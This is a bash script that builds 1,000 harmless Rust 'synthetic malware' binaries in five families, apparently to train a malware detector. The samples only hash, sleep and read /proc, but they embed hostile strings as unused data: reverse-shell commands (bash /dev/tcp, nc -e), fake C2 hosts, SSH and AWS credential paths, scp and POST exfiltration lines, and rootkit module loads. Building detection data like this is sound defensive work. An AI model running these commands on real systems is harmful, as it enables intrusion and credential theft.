#!/bin/bash
set -e

OUTPUT_DIR="samples_1000"
mkdir -p "$OUTPUT_DIR"

echo "ðŸ§ª Generating 1,000 synthetic malware samples..."
echo "This will take ~10-15 minutes and use ~4GB disk space"
echo ""

# Function to create a sample with variations
create_sample() {
    local id=$1
    local category=$2
    local variation=$3
    
    # Different malware "families" with unique characteristics
    case $category in
        1) # Ransomware-like (high crypto, file operations)
            cat > /tmp/sample_${id}.rs << 'EOF'
use std::collections::hash_map::DefaultHasher;
use std::hash::{Hash, Hasher};
fn main() {
    let _ransom = "YOUR FILES ENCRYPTED! BTC: bc1qfake";
    let _exts = vec![".pdf", ".docx", ".jpg", ".mp4"];
    for i in 0..CRYPTO_OPS {
        let mut h = DefaultHasher::new();
        i.hash(&mut h);
        let _ = h.finish();
    }
    for _ in 0..FILE_READS {
        std::fs::read_to_string("/proc/cpuinfo").ok();
    }
    println!("Sample SAMPLE_ID");
}
EOF
            ;;
        2) # Trojan-like (network patterns, persistence)
            cat > /tmp/sample_${id}.rs << 'EOF'
fn main() {
    let _c2 = vec!["http://DOMAIN.onion:PORT", "tcp://IP:PORT"];
    let _persist = vec!["/etc/crontab", "~/.bashrc", "~/.config/autostart"];
    let _shells = vec!["bash -i >& /dev/tcp/IP/PORT", "nc -e /bin/sh IP PORT"];
    for _ in 0..NETWORK_OPS {
        std::thread::sleep(std::time::Duration::from_millis(1));
    }
    for _ in 0..SYSCALLS {
        std::fs::read_to_string("/proc/version").ok();
    }
    println!("Sample SAMPLE_ID");
}
EOF
            ;;
        3) # Worm-like (scanning, propagation)
            cat > /tmp/sample_${id}.rs << 'EOF'
fn main() {
    let _targets: Vec<String> = (1..255).map(|i| format!("192.168.1.{}", i)).collect();
    let _ports = vec![21, 22, 23, 80, 443, 445, 3389, 8080];
    let _exploits = vec!["EternalBlue", "ms17-010", "CVE-YEAR-NUMBER"];
    for _ in 0..SCAN_OPS {
        std::thread::sleep(std::time::Duration::from_micros(100));
    }
    println!("Sample SAMPLE_ID");
}
EOF
            ;;
        4) # Rootkit-like (hiding, kernel access)
            cat > /tmp/sample_${id}.rs << 'EOF'
fn main() {
    let _kernel = vec!["insmod evil.ko", "modprobe rootkit", "/dev/kmem"];
    let _hide = vec!["/tmp/...", "/var/tmp/. ", ".hidden"];
    let _hooks = vec!["sys_read", "sys_write", "sys_open"];
    std::env::set_var("LD_PRELOAD", "/tmp/.hidden.so");
    for _ in 0..HIDE_OPS {
        std::fs::metadata("/proc/self/status").ok();
    }
    println!("Sample SAMPLE_ID");
}
EOF
            ;;
        5) # Spyware-like (keylogging, exfiltration)
            cat > /tmp/sample_${id}.rs << 'EOF'
fn main() {
    let _targets = vec!["~/.ssh/id_rsa", "~/.aws/credentials", "/etc/passwd"];
    let _upload = vec!["POST /exfil HTTP/1.1", "scp data user@IP:/tmp"];
    for _ in 0..SPY_OPS {
        std::fs::read_to_string("/etc/passwd").ok();
        std::env::var("USER").ok();
    }
    println!("Sample SAMPLE_ID");
}
EOF
            ;;
    esac
    
    # Apply variations (randomize numbers for diversity)
    sed -i "s/SAMPLE_ID/$id/g" /tmp/sample_${id}.rs
    sed -i "s/CRYPTO_OPS/$((500 + variation * 100))/g" /tmp/sample_${id}.rs
    sed -i "s/FILE_READS/$((30 + variation * 5))/g" /tmp/sample_${id}.rs
    sed -i "s/NETWORK_OPS/$((20 + variation * 3))/g" /tmp/sample_${id}.rs
    sed -i "s/SYSCALLS/$((40 + variation * 8))/g" /tmp/sample_${id}.rs
    sed -i "s/SCAN_OPS/$((100 + variation * 20))/g" /tmp/sample_${id}.rs
    sed -i "s/HIDE_OPS/$((25 + variation * 5))/g" /tmp/sample_${id}.rs
    sed -i "s/SPY_OPS/$((15 + variation * 3))/g" /tmp/sample_${id}.rs
    sed -i "s/DOMAIN/evil$((variation))/g" /tmp/sample_${id}.rs
    sed -i "s/PORT/$((4444 + variation))/g" /tmp/sample_${id}.rs
    sed -i "s/IP/10.0.0.$((variation))/g" /tmp/sample_${id}.rs
    sed -i "s/YEAR/202$((variation % 5))/g" /tmp/sample_${id}.rs
    sed -i "s/NUMBER/$((1000 + id))/g" /tmp/sample_${id}.rs
}

# Generate 1000 samples across 5 malware families
echo "Creating source files..."
for i in $(seq 1 1000); do
    category=$(( (i % 5) + 1 ))
    variation=$(( i % 50 ))
    create_sample $i $category $variation
    
    if (( i % 100 == 0 )); then
        echo "  Created $i/1000 source files..."
    fi
done

echo ""
echo "Compiling binaries (this will take 10-15 minutes)..."
echo "Using $(nproc) CPU cores"
echo ""

# Compile in parallel batches to avoid overwhelming the system
compile_batch() {
    local start=$1
    local end=$2
    for i in $(seq $start $end); do
        rustc -C opt-level=s -C strip=symbols /tmp/sample_${i}.rs -o "$OUTPUT_DIR/malware_${i}" 2>/dev/null &
    done
    wait
}

# Compile in batches of 50 (adjust based on CPU cores)
BATCH_SIZE=50
for start in $(seq 1 $BATCH_SIZE 1000); do
    end=$((start + BATCH_SIZE - 1))
    if (( end > 1000 )); then
        end=1000
    fi
    compile_batch $start $end
    echo "  Compiled $end/1000 binaries..."
done

# Cleanup temp files
rm /tmp/sample_*.rs

echo ""
echo "âœ… Done!"
echo "Created $(ls -1 $OUTPUT_DIR | wc -l) synthetic malware samples"
echo "Disk usage: $(du -sh $OUTPUT_DIR | cut -f1)"
echo ""
echo "Sample distribution:"
echo "  Ransomware-like:  200 samples"
echo "  Trojan-like:      200 samples"
echo "  Worm-like:        200 samples"
echo "  Rootkit-like:     200 samples"
echo "  Spyware-like:     200 samples"
echo ""
echo "Next: Extract features with:"
echo "  cd ../extractor"
echo "  ./target/release/arm64_extractor --input ../synthetic-malware/samples_1000 --output ../datasets/malicious_1000.jsonl --label 1 --source synthetic"
